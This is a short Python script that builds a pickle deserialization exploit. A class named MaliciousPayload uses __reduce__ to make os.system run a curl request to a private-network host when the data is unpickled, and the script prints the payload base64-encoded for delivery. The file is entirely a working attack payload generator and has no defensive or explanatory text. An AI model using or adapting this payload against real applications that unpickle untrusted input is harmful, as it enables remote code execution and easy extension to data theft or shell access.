import pickle
import os
import base64
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('curl http://192.168.0.103:9999/test',))
        #return (print, ('abcd',))
payload = MaliciousPayload()
serialized_payload = pickle.dumps(payload)
print(base64.urlsafe_b64encode(serialized_payload))
#pickle.loads(serialized_payload)
